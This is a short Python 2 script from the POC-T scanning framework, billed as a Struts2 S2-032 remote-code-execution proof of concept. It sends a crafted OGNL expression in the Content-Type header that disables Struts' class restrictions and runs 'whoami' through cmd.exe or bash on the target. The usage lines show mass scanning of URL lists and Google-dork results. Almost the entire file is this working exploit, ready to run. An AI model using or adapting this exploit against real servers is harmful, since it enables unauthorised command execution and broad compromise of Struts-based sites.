#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Struts S2-032 RCE PoC

Usage:
  python POC-T.py -s struts2-s2032 -iF url.txt
  python POC-T.py -s struts2-s2032 -aG "inurl:index.action"

"""

import random
import requests
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import urllib2

def poc(url):
    try:
        if '://' not in url:
            url = 'http://' + url
        url = url.split('?')[0]

        register_openers()
        datagen, header = multipart_encode({"image1": '123123'})
        header[
            "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"] = '''%{(#nike='multipart/form-data').
        (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
        (#_memberAccess?(#_memberAccess=#dm):
        ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
        (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
        (#context.setMemberAccess(#dm)))).(#cmd='whoami').
        (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
        (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
        (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
        (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
        getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
        (#ros.flush())}'''
        request = urllib2.Request(url, datagen, headers=header)
        response = urllib2.urlopen(request)
        text = response.read()
        if len(text) > 500:
            return False
        else:
            return "[+] WARNING [url:{0}----User:{1}]".format(url, text.strip())
    except Exception:
        return False